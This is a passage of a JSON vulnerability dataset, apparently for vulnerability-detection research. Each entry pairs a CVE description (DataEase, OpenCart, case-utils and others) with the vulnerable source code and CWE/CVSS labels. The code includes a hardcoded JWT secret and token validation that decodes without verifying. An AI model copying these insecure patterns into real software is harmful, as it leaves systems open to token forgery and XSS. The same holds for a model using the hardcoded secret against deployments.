\"UTF-8\");\n                Writer writer = encoding == null ? response.getWriter() : new OutputStreamWriter(response.getOutputStream(), encoding);\n\n                ((WriterExporter) exporter).export(project, params, engine, writer);\n                writer.close();\n            } else if (exporter instanceof StreamExporter) {\n                response.setCharacterEncoding(\"UTF-8\");\n\n                OutputStream stream = response.getOutputStream();\n                ((StreamExporter) exporter).export(project, params, engine, stream);\n                stream.close();\n            } else {\n                // TODO: Should this use ServletException instead of respondException?\n                respondException(response, new RuntimeException(\"Unknown exporter type\"));\n            }\n        } catch (Exception e) {\n            // Use generic error handling rather than our JSON handling\n            logger.info(\"error:{}\", e.getMessage());\n            if (e instanceof SqlExporterException) {\n                response.sendError(HttpStatus.SC_BAD_REQUEST, e.getMessage());\n            }\n            throw new ServletException(e);\n        } finally {\n            ProjectManager.singleton.setBusy(false);\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 108,
          "content": "            String contentType = params.get(\"contentType\");"
        },
        {
          "line_no": 109,
          "content": "            if (contentType == null) {"
        },
        {
          "line_no": 110,
          "content": "                contentType = exporter.getContentType();"
        },
        {
          "line_no": 111,
          "content": "            }"
        },
        {
          "line_no": 112,
          "content": "            response.setHeader(\"Content-Type\", contentType);"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-348"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 1285,
    "cve": "CVE-2024-52295",
    "description": "DataEase is an open source data visualization analysis tool. Prior to 2.10.2, DataEase allows attackers to forge jwt and take over services. The JWT secret is hardcoded in the code, and the UID and OID are hardcoded. The vulnerability has been fixed in v2.10.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/core-backend/src/main/java/io/dataease/substitute/permissions/login/SubstituleLoginServer.java",
          "content": "package io.dataease.substitute.permissions.login;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.JWTCreator;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport io.dataease.api.permissions.login.dto.PwdLoginDTO;\nimport io.dataease.auth.bo.TokenUserBO;\nimport io.dataease.auth.vo.TokenVO;\nimport io.dataease.utils.LogUtil;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@Component\n@ConditionalOnMissingBean(name = \"loginServer\")\n@RestController\n@RequestMapping\npublic class SubstituleLoginServer {\n\n    @PostMapping(\"/login/localLogin\")\n    public TokenVO localLogin(PwdLoginDTO dto) {\n        TokenUserBO tokenUserBO = new TokenUserBO();\n        tokenUserBO.setUserId(1L);\n        tokenUserBO.setDefaultOid(1L);\n        String md5Pwd = \"83d923c9f1d8fcaa46cae0ed2aaa81b5\";\n        return generate(tokenUserBO, md5Pwd);\n    }\n\n\n    @GetMapping(\"/logout\")\n    public void logout() {\n        LogUtil.info(\"substitule logout\");\n    }\n\n    private TokenVO generate(TokenUserBO bo, String secret) {\n        Algorithm algorithm = Algorithm.HMAC256(secret);\n        Long userId = bo.getUserId();\n        Long defaultOid = bo.getDefaultOid();\n        JWTCreator.Builder builder = JWT.create();\n        builder.withClaim(\"uid\", userId).withClaim(\"oid\", defaultOid);\n        String token = builder.sign(algorithm);\n        return new TokenVO(token, 0L);\n    }\n}\n"
        },
        {
          "name": "sdk/common/src/main/java/io/dataease/auth/filter/TokenFilter.java",
          "content": "package io.dataease.auth.filter;\n\nimport io.dataease.auth.bo.TokenUserBO;\nimport io.dataease.constant.AuthConstant;\nimport io.dataease.utils.*;\nimport jakarta.servlet.FilterConfig;\nimport jakarta.servlet.*;\nimport jakarta.servlet.http.HttpServletRequest;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.IOException;\nimport java.util.Objects;\n\npublic class TokenFilter implements Filter {\n\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        String requestURI = request.getRequestURI();\n\n        if (ModelUtils.isDesktop()) {\n            UserUtils.setDesktopUser();\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n\n        if (WhitelistUtils.match(requestURI)) {\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        if (StringUtils.equalsIgnoreCase(\"OPTIONS\", ServletUtils.request().getMethod())) {\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        /*String refreshToken = null;\n        if (StringUtils.isNotBlank(refreshToken = ServletUtils.request().getHeader(AuthConstant.REFRESH_TOKEN_KEY))) {\n            ServletUtils.response().addHeader(AuthConstant.REFRESH_TOKEN_KEY, refreshToken);\n        }*/\n        String executeVersion = null;\n        if (StringUtils.isNotBlank(executeVersion = VersionUtil.getRandomVersion())) {\n            Objects.requireNonNull(ServletUtils.response()).addHeader(AuthConstant.DE_EXECUTE_VERSION, executeVersion);\n        }\n        String linkToken = ServletUtils.getHead(AuthConstant.LINK_TOKEN_KEY);\n        if (StringUtils.isNotBlank(linkToken)) {\n            TokenUserBO tokenUserBO = TokenUtils.validateLinkToken(linkToken);\n            UserUtils.setUserInfo(tokenUserBO);\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        String token = ServletUtils.getToken();\n        TokenUserBO userBO = TokenUtils.validate(token);\n        UserUtils.setUserInfo(userBO);\n        filterChain.doFilter(servletRequest, servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n    }\n}\n"
        },
        {
          "name": "sdk/common/src/main/java/io/dataease/utils/TokenUtils.java",
          "content": "package io.dataease.utils;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport io.dataease.auth.bo.TokenUserBO;\nimport io.dataease.exception.DEException;\nimport org.apache.commons.lang3.ObjectUtils;\nimport org.apache.commons.lang3.StringUtils;\n\npublic class TokenUtils {\n\n\n    public static TokenUserBO userBOByToken(String token) {\n        DecodedJWT jwt = JWT.decode(token);\n        Long userId = jwt.getClaim(\"uid\").asLong();\n        Long oid = jwt.getClaim(\"oid\").asLong();\n        if (ObjectUtils.isEmpty(userId)) {\n            DEException.throwException(\"token格式错误！\");\n        }\n        return new TokenUserBO(userId, oid);\n    }\n\n    public static TokenUserBO validate(String token) {\n        if (StringUtils.isBlank(token)) {\n            String uri = ServletUtils.request().getRequestURI();\n            DEException.throwException(\"token is empty for uri {\" + uri + \"}\");\n        }\n        if (StringUtils.length(token) < 100) {\n            DEException.throwException(\"token is invalid\");\n        }\n        return userBOByToken(token);\n    }\n\n    public static TokenUserBO validateLinkToken(String linkToken) {\n        if (StringUtils.isBlank(linkToken)) {\n            String uri = ServletUtils.request().getRequestURI();\n            DEException.throwException(\"link token is empty for uri {\" + uri + \"}\");\n        }\n        if (StringUtils.length(linkToken) < 100) {\n            DEException.throwException(\"token is invalid\");\n        }\n        DecodedJWT jwt = JWT.decode(linkToken);\n        Long userId = jwt.getClaim(\"uid\").asLong();\n        Long oid = jwt.getClaim(\"oid\").asLong();\n        if (ObjectUtils.isEmpty(userId)) {\n            DEException.throwException(\"link token格式错误！\");\n        }\n        return new TokenUserBO(userId, oid);\n    }\n}\n"
        }
      ],
      "method_level": [
        "@PostMapping(\"/login/localLogin\")\n    public TokenVO localLogin(PwdLoginDTO dto) {\n        TokenUserBO tokenUserBO = new TokenUserBO();\n        tokenUserBO.setUserId(1L);\n        tokenUserBO.setDefaultOid(1L);\n        String md5Pwd = \"83d923c9f1d8fcaa46cae0ed2aaa81b5\";\n        return generate(tokenUserBO, md5Pwd);\n    }",
        "@Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        String requestURI = request.getRequestURI();\n\n        if (ModelUtils.isDesktop()) {\n            UserUtils.setDesktopUser();\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n\n        if (WhitelistUtils.match(requestURI)) {\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        if (StringUtils.equalsIgnoreCase(\"OPTIONS\", ServletUtils.request().getMethod())) {\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        /*String refreshToken = null;\n        if (StringUtils.isNotBlank(refreshToken = ServletUtils.request().getHeader(AuthConstant.REFRESH_TOKEN_KEY))) {\n            ServletUtils.response().addHeader(AuthConstant.REFRESH_TOKEN_KEY, refreshToken);\n        }*/\n        String executeVersion = null;\n        if (StringUtils.isNotBlank(executeVersion = VersionUtil.getRandomVersion())) {\n            Objects.requireNonNull(ServletUtils.response()).addHeader(AuthConstant.DE_EXECUTE_VERSION, executeVersion);\n        }\n        String linkToken = ServletUtils.getHead(AuthConstant.LINK_TOKEN_KEY);\n        if (StringUtils.isNotBlank(linkToken)) {\n            TokenUserBO tokenUserBO = TokenUtils.validateLinkToken(linkToken);\n            UserUtils.setUserInfo(tokenUserBO);\n            filterChain.doFilter(servletRequest, servletResponse);\n            return;\n        }\n        String token = ServletUtils.getToken();\n        TokenUserBO userBO = TokenUtils.validate(token);\n        UserUtils.setUserInfo(userBO);\n        filterChain.doFilter(servletRequest, servletResponse);\n    }",
        "public static TokenUserBO validate(String token) {\n        if (StringUtils.isBlank(token)) {\n            String uri = ServletUtils.request().getRequestURI();\n            DEException.throwException(\"token is empty for uri {\" + uri + \"}\");\n        }\n        if (StringUtils.length(token) < 100) {\n            DEException.throwException(\"token is invalid\");\n        }\n        return userBOByToken(token);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    public TokenVO localLogin(PwdLoginDTO dto) {"
        },
        {
          "line_no": 28,
          "content": "        String md5Pwd = \"83d923c9f1d8fcaa46cae0ed2aaa81b5\";"
        },
        {
          "line_no": 39,
          "content": "        /*String refreshToken = null;"
        },
        {
          "line_no": 40,
          "content": "        if (StringUtils.isNotBlank(refreshToken = ServletUtils.request().getHeader(AuthConstant.REFRESH_TOKEN_KEY))) {"
        },
        {
          "line_no": 41,
          "content": "            ServletUtils.response().addHeader(AuthConstant.REFRESH_TOKEN_KEY, refreshToken);"
        },
        {
          "line_no": 42,
          "content": "        }*/"
        },
        {
          "line_no": 55,
          "content": "        TokenUserBO userBO = TokenUtils.validate(token);"
        },
        {
          "line_no": 56,
          "content": "        UserUtils.setUserInfo(userBO);"
        },
        {
          "line_no": 31,
          "content": "        return userBOByToken(token);"
        }
      ]
    },
    "cwe": [
      "CWE-798"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.3,
    "cvss_version": 4.0
  },
  {
    "id": 878,
    "cve": "CVE-2024-21515",
    "description": "This affects versions of the package opencart/opencart from 4.0.0.0. A reflected XSS issue was identified in the filename parameter of the admin tool/log route. An attacker could obtain a user's token by tricking the user to click on a maliciously crafted URL. The user is then prompted to login and redirected again upon authentication with the payload automatically executing. If the attacked user has admin privileges, this vulnerability could be used as the start of a chain of exploits like Zip Slip or arbitrary file write vulnerabilities in the admin functionality.\r\r**Notes:**\r\r1) This is only exploitable if the attacker knows the name or path of the admin directory. The name of the directory is \"admin\" by default but there is a pop-up in the dashboard warning users to rename it.\r\r2) The fix for this vulnerability is incomplete. The redirect is removed so that it is not possible for an attacker to control the redirect post admin login anymore, but it is still possible to exploit this issue in admin if the user is authenticated as an admin already.",
    "vulnerability": {
      "file_level": [
        {
          "name": "upload/admin/controller/common/login.php",
          "content": "<?php\nnamespace Opencart\\Admin\\Controller\\Common;\n/**\n * Class Login\n *\n * @package Opencart\\Admin\\Controller\\Common\n */\nclass Login extends \\Opencart\\System\\Engine\\Controller {\n\t/**\n\t * Index\n\t *\n\t * @return void\n\t */\n\tpublic function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}\n\n\t/**\n\t * Login\n\t *\n\t * @return void\n\t */\n\tpublic function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}",
        "public function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 54,
          "content": "\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {"
        },
        {
          "line_no": 55,
          "content": "\t\t\t$args = $this->request->get;"
        },
        {
          "line_no": 57,
          "content": "\t\t\t$route = $args['route'];"
        },
        {
          "line_no": 59,
          "content": "\t\t\tunset($args['route']);"
        },
        {
          "line_no": 60,
          "content": "\t\t\tunset($args['user_token']);"
        },
        {
          "line_no": 62,
          "content": "\t\t\t$url = '';"
        },
        {
          "line_no": 64,
          "content": "\t\t\t$url .= http_build_query($args);"
        },
        {
          "line_no": 66,
          "content": "\t\t\t$data['redirect'] = $this->url->link($route, $url);"
        },
        {
          "line_no": 67,
          "content": "\t\t} else {"
        },
        {
          "line_no": 68,
          "content": "\t\t\t$data['redirect'] = '';"
        },
        {
          "line_no": 69,
          "content": "\t\t}"
        },
        {
          "line_no": 129,
          "content": "\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {"
        },
        {
          "line_no": 130,
          "content": "\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];"
        },
        {
          "line_no": 131,
          "content": "\t\t\t} else {"
        },
        {
          "line_no": 132,
          "content": "\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);"
        },
        {
          "line_no": 133,
          "content": "\t\t\t}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "LOW",
    "cvss_score": 2.1,
    "cvss_version": 4.0
  },
  {
    "id": 61,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.2\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of 